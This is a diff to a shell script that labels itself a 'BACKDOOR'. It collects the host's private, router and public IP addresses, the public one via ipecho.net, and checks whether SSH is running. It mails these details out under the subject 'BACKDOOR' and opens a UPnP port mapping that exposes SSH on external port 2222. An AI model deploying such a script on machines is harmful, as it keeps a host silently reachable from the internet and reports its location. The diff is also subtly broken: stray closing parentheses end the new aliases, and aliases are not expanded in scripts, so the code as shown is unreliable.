@@ -55,11 +55,15 @@ exit
 
 
 #-----------------------------MAIN FUNCTIONS:------------------------------------------------
+alias ip_private="ip route get 1 | sed -r -n 's/.*src ([0-9.:]+).*/\1/p')" # long live sed
+alias  ip_router="ip route get 1 | sed -r -n 's/.*via ([0-9.:]+).*/\1/p')"
+alias  ip_public="curl -s ipecho.net/plain" # -s kills progress output
+
 function getdata # Gather Statistics
 {
-echo -e "IP PRIVATE\t   - $(ip route get 1 | sed -r -n 's/.*src ([0-9.:]+).*/\1/p')" # long live sed
-echo -e "IP ROUTER\t    - $(ip route get 1 | sed -r -n 's/.*via ([0-9.:]+).*/\1/p')"
-echo -e "IP PUBLIC\t    - $(curl -s ipecho.net/plain)" # -s kills progress output
+echo -e "IP PRIVATE\t   - $(ip_private)" # long live sed
+echo -e "IP ROUTER\t    - $(ip_router)"
+echo -e "IP PUBLIC\t    - $(ip_public)" # -s kills progress output
 systemctl | grep $sshservice &>/dev/null && ssh='ENABLED' || ssh='DISABLED'
 echo -e "SSH\t          -> $ssh"
 }
@@ -83,7 +87,7 @@ echo -e "$(date)\n$data" | mail -s 'BACKDOOR' $emailaddress # requires postfix o
 # 2. update upnp mapping because priv ip might have changed (dhcp), or new network (pub ip change)
 # (can verify with `upnpc -l`)
 upnpc -d 2222 TCP # requires miniupnp
-upnpc -r 22 2222 TCP
+upnpc -a "$(ip_private)" 22 2222 TCP
 }
 
 
